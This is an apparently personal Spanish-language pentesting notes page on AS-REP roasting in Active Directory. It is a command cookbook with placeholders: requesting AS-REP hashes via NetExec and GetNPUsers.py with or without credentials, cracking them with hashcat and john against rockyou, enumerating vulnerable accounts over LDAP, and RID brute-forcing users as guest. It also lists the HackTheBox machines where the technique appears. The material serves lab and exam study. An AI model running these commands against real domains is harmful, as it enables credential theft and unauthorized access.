# Técnica: asreproast

[[00-inicio|Inicio]] · [[Entorno|Entorno]] · [[Puertos|Puertos]] · [[Servicios|Servicios]] · [[Tecnicas|Tecnicas]] · [[Maquinas|Maquinas]] · [[Referencias|Referencias]]

**11 máquina(s)** mencionan esta técnica.

Alias buscados: `as-rep roast`, `asrep roast`, `as-rep roasting`

> Esta técnica tiene **recetario de comandos**. Está más abajo, después de la lista de máquinas.

## Comandos

> **Placeholders**: `<DC_IP>` · `<DOMINIO>` · `<USER>`/`<PASS>` · `<NTHASH>`

### Qué es

Cuentas con **preautenticación de Kerberos deshabilitada** (`DONT_REQ_PREAUTH`).
Cualquiera puede pedir un AS-REP para ellas y el hash viene cifrado con su
contraseña. **No requiere credenciales válidas.**

### Con credenciales (enumera y ataca)

```bash
/usr/bin/nxc ldap <DC_IP> -u '<USER>' -p '<PASS>' -d <DOMINIO> --asreproast asrep.txt
```

### Sin credenciales

```bash
# Con lista de usuarios
GetNPUsers.py <DOMINIO>/ -no-pass -dc-ip <DC_IP> -usersfile usuarios.txt \
              -outputfile asrep.txt -format hashcat

# Con un usuario concreto
GetNPUsers.py <DOMINIO>/'<USUARIO>' -no-pass -dc-ip <DC_IP> -request -outputfile asrep.txt
```

### Crackear

```bash
# El hash arranca con $krb5asrep$23$
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
john --format=krb5asrep --wordlist=/usr/share/wordlists/rockyou.txt asrep.txt
```

### Enumerar quién es vulnerable (necesita credenciales para LDAP)

```bash
# NetExec lo hace directo
/usr/bin/nxc ldap <DC_IP> -u '<USER>' -p '<PASS>' -d <DOMINIO> --password-not-required

# Con ldapsearch crudo
ldapsearch -x -H ldap://<DC_IP> -D '<USER>@<DOMINIO>' -w '<PASS>' \
  -b "DC=<dom>,DC=<local>" "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" \
  sAMAccountName
```

> **Truco**: si no tenés ninguna credencial y no hay lista de usuarios, la
> enumeración de usuarios por RID te la da:
> `/usr/bin/nxc smb <DC_IP> -u 'guest' -p '' --rid-brute`

## Referencias

- [[WADComs|WADComs (espejo local)]] — https://wadcoms.github.io/
- [The Hacker Recipes](https://www.thehacker.recipes/)

---

## Máquinas

- [[htb-sauna\|Sauna]] — 7 mención(es) · Windows · Easy
- [[htb-forest\|Forest]] — 6 mención(es) · Windows · Easy
- [[htb-multimaster\|Multimaster]] — 5 mención(es) · Windows · Insane
- [[htb-sherlock-campfire-2\|Campfire-2]] — 5 mención(es) · Very
- [[htb-bruno\|Bruno]] — 3 mención(es) · Windows · Medium
- [[htb-pivotapi\|PivotAPI]] — 3 mención(es) · Windows · Insane
- [[htb-active\|Active]] — 2 mención(es) · Windows · Easy
- [[htb-blackfield\|Blackfield]] — 1 mención(es) · Windows · Hard
- [[htb-intelligence\|Intelligence]] — 1 mención(es) · Windows · Medium
- [[htb-jab\|Jab]] — 1 mención(es) · Windows · Medium
- [[htb-rebound\|Rebound]] — 1 mención(es) · Windows · Insane

## Cómo ver el contexto

```bash
python3 _sistema/herramientas/buscar.py 'asreproast' -v
python3 _sistema/herramientas/buscar.py 'asreproast' -v --oscp
```
